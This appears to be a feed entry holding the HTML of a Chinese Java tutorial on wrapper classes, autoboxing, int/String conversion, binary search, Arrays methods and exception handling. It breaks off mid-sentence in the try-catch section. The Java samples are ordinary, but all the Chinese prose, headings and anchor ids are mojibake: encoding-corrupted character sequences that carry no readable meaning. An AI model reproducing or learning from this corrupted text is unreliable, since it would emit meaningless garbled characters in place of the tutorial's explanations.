        <content type="html"><![CDATA[<h2 id="åŒ…è£…ç±»"><a href="#åŒ…è£…ç±»" class="headerlink" title="åŒ…è£…ç±»"></a>åŒ…è£…ç±»</h2><h4 id="åŸºæœ¬ç±»å‹åŒ…è£…ç±»"><a href="#åŸºæœ¬ç±»å‹åŒ…è£…ç±»" class="headerlink" title="åŸºæœ¬ç±»å‹åŒ…è£…ç±»"></a>åŸºæœ¬ç±»å‹åŒ…è£…ç±»</h4><ul><li><p>ä½œç”¨</p><p>å°†åŸºæœ¬æ•°æ®ç±»å‹å°è£…æˆå¯¹è±¡çš„å¥½å¤„åœ¨äºå¯ä»¥åœ¨å¯¹è±¡ä¸­å®šä¹‰æ›´å¤šçš„åŠŸèƒ½æ–¹æ³•æ“ä½œè¯¥æ•°æ®</p><p>å¸¸ç”¨çš„æ“ä½œä¹‹ä¸€ï¼šç”¨äºåŸºæœ¬æ•°æ®ç±»å‹ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢</p></li><li><p>åŸºæœ¬ç±»å‹å¯¹åº”çš„åŒ…è£…ç±»</p><table><thead><tr><th>åŸºæœ¬æ•°æ®ç±»å‹</th><th>åŒ…è£…ç±»</th></tr></thead><tbody><tr><td>byte</td><td>Byte</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>int</td><td>Integer</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr><tr><td>char</td><td>Character</td></tr><tr><td>boolean</td><td>Boolean</td></tr></tbody></table></li></ul><h4 id="Integerç±»"><a href="#Integerç±»" class="headerlink" title="Integerç±»"></a>Integerç±»</h4><p>åŒ…è£…ä¸€ä¸ªå¯¹è±¡ä¸­çš„åŸå§‹ç±»å‹ int çš„å€¼</p><p><strong>Integerç±»æ„é€ æ–¹æ³•</strong></p><table><thead><tr><th>æ–¹æ³•å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>public Integer(int   value)</td><td>æ ¹æ® int å€¼åˆ›å»º Integer å¯¹è±¡(è¿‡æ—¶)</td></tr><tr><td>public Integer(String s)</td><td>æ ¹æ® String å€¼åˆ›å»º Integer å¯¹è±¡(è¿‡æ—¶)</td></tr><tr><td>public static Integer valueOf(int i)</td><td>è¿”å›è¡¨ç¤ºæŒ‡å®šçš„ int å€¼çš„ Integer   å®ä¾‹</td></tr><tr><td>public static Integer valueOf(String s)</td><td>è¿”å›ä¸€ä¸ªä¿å­˜æŒ‡å®šå€¼çš„ Integer å¯¹è±¡ String</td></tr></tbody></table><h4 id="è‡ªåŠ¨æ‹†ç®±å’Œè‡ªåŠ¨è£…ç®±"><a href="#è‡ªåŠ¨æ‹†ç®±å’Œè‡ªåŠ¨è£…ç®±" class="headerlink" title="è‡ªåŠ¨æ‹†ç®±å’Œè‡ªåŠ¨è£…ç®±"></a>è‡ªåŠ¨æ‹†ç®±å’Œè‡ªåŠ¨è£…ç®±</h4><ul><li><p>è‡ªåŠ¨è£…ç®±</p><p>â€‹    æŠŠåŸºæœ¬æ•°æ®ç±»å‹è½¬æ¢ä¸ºå¯¹åº”çš„åŒ…è£…ç±»ç±»å‹</p></li><li><p>è‡ªåŠ¨æ‹†ç®±</p><p>â€‹    æŠŠåŒ…è£…ç±»ç±»å‹è½¬æ¢ä¸ºå¯¹åº”çš„åŸºæœ¬æ•°æ®ç±»å‹</p></li><li><p>ç¤ºä¾‹ä»£ç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span> i <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>  <span class="token comment">// è‡ªåŠ¨è£…ç®±</span>i <span class="token operator">+=</span> <span class="token number">200</span><span class="token punctuation">;</span>         <span class="token comment">// i = i + 200;  i + 200 è‡ªåŠ¨æ‹†ç®±ï¼›i = i + 200; æ˜¯è‡ªåŠ¨è£…ç®±</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h4 id="intå’ŒStringç±»å‹çš„ç›¸äº’è½¬æ¢"><a href="#intå’ŒStringç±»å‹çš„ç›¸äº’è½¬æ¢" class="headerlink" title="intå’ŒStringç±»å‹çš„ç›¸äº’è½¬æ¢"></a>intå’ŒStringç±»å‹çš„ç›¸äº’è½¬æ¢</h4><ul><li><p>intè½¬æ¢ä¸ºString</p><p>è½¬æ¢æ–¹å¼</p><ul><li>æ–¹å¼ä¸€ï¼šç›´æ¥åœ¨æ•°å­—ååŠ ä¸€ä¸ªç©ºå­—ç¬¦ä¸²</li><li>æ–¹å¼äºŒï¼šé€šè¿‡Stringç±»é™æ€æ–¹æ³•valueOf()</li></ul></li></ul><p>ç¤ºä¾‹ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IntegerDemo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//int --- String</span>        <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>        <span class="token comment">//æ–¹å¼1</span>        <span class="token class-name">String</span> s1 <span class="token operator">=</span> number <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//æ–¹å¼2</span>        <span class="token comment">//public static String valueOf(int i)</span>        <span class="token class-name">String</span> s2 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"--------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Stringè½¬æ¢ä¸ºint<ul><li><p>è½¬æ¢æ–¹å¼</p><ul><li>æ–¹å¼ä¸€ï¼šå…ˆå°†å­—ç¬¦ä¸²æ•°å­—è½¬æˆIntegerï¼Œå†è°ƒç”¨valueOf()æ–¹æ³•</li><li>æ–¹å¼äºŒï¼šé€šè¿‡Integeré™æ€æ–¹æ³•parseInt()è¿›è¡Œè½¬æ¢</li></ul></li></ul></li></ul><p>ç¤ºä¾‹ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IntegerDemo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//String --- int</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"100"</span><span class="token punctuation">;</span>        <span class="token comment">//æ–¹å¼1ï¼šString --- Integer --- int</span>        <span class="token class-name">Integer</span> i <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//public int intValue()</span>        <span class="token keyword">int</span> x <span class="token operator">=</span> i<span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//æ–¹å¼2</span>        <span class="token comment">//public static int parseInt(String s)</span>        <span class="token keyword">int</span> y <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ•°ç»„äºŒåˆ†æŸ¥æ‰¾æ ·ä¾‹"><a href="#æ•°ç»„äºŒåˆ†æŸ¥æ‰¾æ ·ä¾‹" class="headerlink" title="æ•°ç»„äºŒåˆ†æŸ¥æ‰¾æ ·ä¾‹"></a>æ•°ç»„äºŒåˆ†æŸ¥æ‰¾æ ·ä¾‹</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BinarySearchDemo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token function">binarySearchForIndex</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">binarySearchForIndex</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> number<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> min <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> max <span class="token operator">=</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">//2.å¾ªç¯æŸ¥æ‰¾ min &lt;= max</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>min <span class="token operator">&lt;=</span> max<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>min <span class="token operator">+</span> max<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&gt;</span> number<span class="token punctuation">)</span><span class="token punctuation">{</span>                max <span class="token operator">=</span> mid <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> number<span class="token punctuation">)</span><span class="token punctuation">{</span>                min <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> mid<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment">//å¦‚æœminå¤§äºäº†maxå°±è¡¨ç¤ºå…ƒç´ ä¸å­˜åœ¨,è¿”å›-1.</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h4><ul><li>Arraysçš„å¸¸ç”¨æ–¹æ³•</li></ul><table><thead><tr><th>æ–¹æ³•å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>public static String toString(int[] a)</td><td>è¿”å›æŒ‡å®šæ•°ç»„çš„å†…å®¹çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼</td></tr><tr><td>public static void sort(int[] a)</td><td>æŒ‰ç…§æ•°å­—é¡ºåºæ’åˆ—æŒ‡å®šçš„æ•°ç»„</td></tr><tr><td>public static int binarySearch(int[] a, int key)</td><td>åˆ©ç”¨äºŒåˆ†æŸ¥æ‰¾è¿”å›æŒ‡å®šå…ƒç´ çš„ç´¢å¼•</td></tr></tbody></table><ul><li>ç¤ºä¾‹ä»£ç </li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyArraysDemo</span> <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">//        public static String toString(int[] a)    è¿”å›æŒ‡å®šæ•°ç»„çš„å†…å®¹çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼</span>  <span class="token comment">//        int [] arr = {3,2,4,6,7};</span>  <span class="token comment">//        System.out.println(Arrays.toString(arr));</span>  <span class="token comment">//        public static void sort(int[] a)  æŒ‰ç…§æ•°å­—é¡ºåºæ’åˆ—æŒ‡å®šçš„æ•°ç»„</span>  <span class="token comment">//        int [] arr = {3,2,4,6,7};</span>  <span class="token comment">//        Arrays.sort(arr);</span>  <span class="token comment">//        System.out.println(Arrays.toString(arr));</span>  <span class="token comment">//        public static int binarySearch(int[] a, int key) åˆ©ç”¨äºŒåˆ†æŸ¥æ‰¾è¿”å›æŒ‡å®šå…ƒç´ çš„ç´¢å¼•</span>          <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">;</span>          <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//1,æ•°ç»„å¿…é¡»æœ‰åº</span>          <span class="token comment">//2.å¦‚æœè¦æŸ¥æ‰¾çš„å…ƒç´ å­˜åœ¨,é‚£ä¹ˆè¿”å›çš„æ˜¯è¿™ä¸ªå…ƒç´ å®é™…çš„ç´¢å¼•</span>          <span class="token comment">//3.å¦‚æœè¦æŸ¥æ‰¾çš„å…ƒç´ ä¸å­˜åœ¨,é‚£ä¹ˆè¿”å›çš„æ˜¯ (-æ’å…¥ç‚¹-1)</span>              <span class="token comment">//æ’å…¥ç‚¹:å¦‚æœè¿™ä¸ªå…ƒç´ åœ¨æ•°ç»„ä¸­,ä»–åº”è¯¥åœ¨å“ªä¸ªç´¢å¼•ä¸Š.</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>å·¥å…·ç±»è®¾è®¡æ€æƒ³</li></ul><ol><li>æ„é€ æ–¹æ³•ç”¨ private ä¿®é¥°</li><li>æˆå‘˜ç”¨ public static ä¿®é¥°</li></ol><h2 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h2><p><img src="/2022/04/03/java-chang-yong-api-er/01_%E5%BC%82%E5%B8%B8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt="å¼‚å¸¸ä½“ç³»ç»“æ„"></p><h4 id="ç¼–è¯‘æ—¶å¼‚å¸¸å’Œè¿è¡Œæ—¶å¼‚å¸¸çš„åŒºåˆ«"><a href="#ç¼–è¯‘æ—¶å¼‚å¸¸å’Œè¿è¡Œæ—¶å¼‚å¸¸çš„åŒºåˆ«" class="headerlink" title="ç¼–è¯‘æ—¶å¼‚å¸¸å’Œè¿è¡Œæ—¶å¼‚å¸¸çš„åŒºåˆ«"></a><strong>ç¼–è¯‘æ—¶å¼‚å¸¸å’Œè¿è¡Œæ—¶å¼‚å¸¸çš„åŒºåˆ«</strong></h4><ul><li><p>ç¼–è¯‘æ—¶å¼‚å¸¸</p><ul><li>éƒ½æ˜¯Exceptionç±»åŠå…¶å­ç±»</li><li>å¿…é¡»æ˜¾ç¤ºå¤„ç†ï¼Œå¦åˆ™ç¨‹åºå°±ä¼šå‘ç”Ÿé”™è¯¯ï¼Œæ— æ³•é€šè¿‡ç¼–è¯‘</li></ul></li><li><p>è¿è¡Œæ—¶å¼‚å¸¸</p><ul><li>éƒ½æ˜¯RuntimeExceptionç±»åŠå…¶å­ç±»</li><li>æ— éœ€æ˜¾ç¤ºå¤„ç†ï¼Œä¹Ÿå¯ä»¥å’Œç¼–è¯‘æ—¶å¼‚å¸¸ä¸€æ ·å¤„ç†</li></ul></li></ul><p><img src="/2022/04/03/java-chang-yong-api-er/image-20220403103449762.png" alt="ç¼–è¯‘æ—¶å¼‚å¸¸å’Œè¿è¡Œæ—¶å¼‚å¸¸"></p><h4 id="JVMé»˜è®¤å¤„ç†å¼‚å¸¸çš„æ–¹å¼"><a href="#JVMé»˜è®¤å¤„ç†å¼‚å¸¸çš„æ–¹å¼" class="headerlink" title="JVMé»˜è®¤å¤„ç†å¼‚å¸¸çš„æ–¹å¼"></a><strong>JVMé»˜è®¤å¤„ç†å¼‚å¸¸çš„æ–¹å¼</strong></h4><ul><li><p>è¯­æ³•é”™è¯¯ä¸åœ¨å¼‚å¸¸èŒƒå›´å†…</p></li><li><p>å½“ä»£ç å‡ºç°å¼‚å¸¸ï¼Œå°±åœ¨è¿™é‡Œåˆ›å»ºä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ã€‚</p></li><li><p>å¦‚æœç¨‹åºå‡ºç°äº†é—®é¢˜ï¼Œè€Œæˆ‘ä»¬æ²¡æœ‰åšä»»ä½•å¤„ç†ï¼Œæœ€ç»ˆJVM ä¼šåšé»˜è®¤çš„å¤„ç†ï¼Œå¤„ç†æ–¹å¼æœ‰å¦‚ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š</p><ul><li><p>æŠŠå¼‚å¸¸çš„åç§°ï¼Œé”™è¯¯åŸå› åŠå¼‚å¸¸å‡ºç°çš„ä½ç½®ç­‰ä¿¡æ¯è¾“å‡ºåœ¨äº†æ§åˆ¶å°</p></li><li><p>ç¨‹åºåœæ­¢æ‰§è¡Œ</p></li></ul></li></ul><h4 id="æŸ¥çœ‹å¼‚å¸¸ä¿¡æ¯"><a href="#æŸ¥çœ‹å¼‚å¸¸ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹å¼‚å¸¸ä¿¡æ¯"></a><strong>æŸ¥çœ‹å¼‚å¸¸ä¿¡æ¯</strong></h4><p>æ§åˆ¶å°åœ¨æ‰“å°å¼‚å¸¸ä¿¡æ¯æ—¶,ä¼šæ‰“å°å¼‚å¸¸ç±»å,å¼‚å¸¸å‡ºç°çš„åŸå› ,å¼‚å¸¸å‡ºç°çš„ä½ç½®</p><p>æˆ‘ä»¬è°ƒbugæ—¶,å¯ä»¥æ ¹æ®æç¤º,æ‰¾åˆ°å¼‚å¸¸å‡ºç°çš„ä½ç½®,åˆ†æåŸå› ,ä¿®æ”¹å¼‚å¸¸ä»£ç </p><h4 id="å¼‚å¸¸å¤„ç†æ–¹å¼"><a href="#å¼‚å¸¸å¤„ç†æ–¹å¼" class="headerlink" title="å¼‚å¸¸å¤„ç†æ–¹å¼"></a>å¼‚å¸¸å¤„ç†æ–¹å¼</h4><ul><li><p>å®šä¹‰æ ¼å¼</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> æ–¹æ³•<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> å¼‚å¸¸ç±»å <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>è¿™ä¸ªthrowsæ ¼å¼æ˜¯è·Ÿåœ¨æ–¹æ³•çš„æ‹¬å·åé¢çš„</p></li><li><p>ç¼–è¯‘æ—¶å¼‚å¸¸å¿…é¡»è¦è¿›è¡Œå¤„ç†ï¼Œä¸¤ç§å¤„ç†æ–¹æ¡ˆï¼štryâ€¦catch â€¦æˆ–è€… throwsï¼Œå¦‚æœé‡‡ç”¨ throws è¿™ç§æ–¹æ¡ˆï¼Œåœ¨æ–¹æ³•ä¸Šè¿›è¡Œæ˜¾ç¤ºå£°æ˜,å°†æ¥è°è°ƒç”¨è¿™ä¸ªæ–¹æ³•è°å¤„ç†</p></li><li><p>è¿è¡Œæ—¶å¼‚å¸¸å› ä¸ºåœ¨è¿è¡Œæ—¶æ‰ä¼šå‘ç”Ÿ,æ‰€ä»¥åœ¨æ–¹æ³•åé¢å¯ä»¥ä¸å†™,è¿è¡Œæ—¶å‡ºç°å¼‚å¸¸é»˜è®¤äº¤ç»™jvmå¤„ç†</p></li></ul><h4 id="throwæŠ›å‡ºå¼‚å¸¸"><a href="#throwæŠ›å‡ºå¼‚å¸¸" class="headerlink" title="throwæŠ›å‡ºå¼‚å¸¸"></a>throwæŠ›å‡ºå¼‚å¸¸</h4><ul><li><p>æ ¼å¼</p><p>throw new å¼‚å¸¸();</p></li><li><p>æ³¨æ„</p><p>è¿™ä¸ªæ ¼å¼æ˜¯åœ¨æ–¹æ³•å†…çš„ï¼Œè¡¨ç¤ºå½“å‰ä»£ç æ‰‹åŠ¨æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œä¸‹é¢çš„ä»£ç ä¸ç”¨å†æ‰§è¡Œäº†</p></li><li><p>throwså’Œthrowçš„åŒºåˆ«</p><table><thead><tr><th>throws</th><th>throw</th></tr></thead><tbody><tr><td>ç”¨åœ¨æ–¹æ³•å£°æ˜åé¢ï¼Œè·Ÿçš„æ˜¯å¼‚å¸¸ç±»å</td><td>ç”¨åœ¨æ–¹æ³•ä½“å†…ï¼Œè·Ÿçš„æ˜¯å¼‚å¸¸å¯¹è±¡å</td></tr><tr><td>è¡¨ç¤ºå£°æ˜å¼‚å¸¸ï¼Œè°ƒç”¨è¯¥æ–¹æ³•æœ‰å¯èƒ½ä¼šå‡ºç°è¿™æ ·çš„å¼‚å¸¸</td><td>è¡¨ç¤ºæ‰‹åŠ¨æŠ›å‡ºå¼‚å¸¸å¯¹è±¡ï¼Œç”±æ–¹æ³•ä½“å†…çš„è¯­å¥å¤„ç†</td></tr></tbody></table></li></ul><ul><li>ç¤ºä¾‹ä»£ç </li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionDemo8</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//int [] arr = {1,2,3,4,5};</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token function">printArr</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°±ä¼š æ¥æ”¶åˆ°ä¸€ä¸ªå¼‚å¸¸.</span>                        <span class="token comment">//æˆ‘ä»¬è¿˜éœ€è¦è‡ªå·±å¤„ç†ä¸€ä¸‹å¼‚å¸¸.</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printArr</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//System.out.println("å‚æ•°ä¸èƒ½ä¸ºnull");</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å½“å‚æ•°ä¸ºnullçš„æ—¶å€™</span>                                            <span class="token comment">//æ‰‹åŠ¨åˆ›å»ºäº†ä¸€ä¸ªå¼‚å¸¸å¯¹è±¡,æŠ›ç»™äº†è°ƒç”¨è€…,äº§ç”Ÿäº†ä¸€ä¸ªå¼‚å¸¸</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="try-catchæ–¹å¼å¤„ç†å¼‚å¸¸"><a href="#try-catchæ–¹å¼å¤„ç†å¼‚å¸¸" class="headerlink" title="try-catchæ–¹å¼å¤„ç†å¼‚å¸¸"></a>try-catchæ–¹å¼å¤„ç†å¼‚å¸¸</h4><ul><li><p>å®šä¹‰æ ¼å¼</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">{</span>å¯èƒ½å‡ºç°å¼‚å¸¸çš„ä»£ç <span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>å¼‚å¸¸ç±»å å˜é‡å<span class="token punctuation">)</span> <span class="token punctuation">{</span>å¼‚å¸¸çš„å¤„ç†ä»£ç <span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>æ‰§è¡Œæµç¨‹</p><ul><li>ç¨‹åºä» try é‡Œé¢çš„ä»£ç å¼€å§‹æ‰§è¡Œ</li><li>å‡ºç°å¼‚å¸¸ï¼Œå°±ä¼šè·³è½¬åˆ°å¯¹åº”çš„ catch 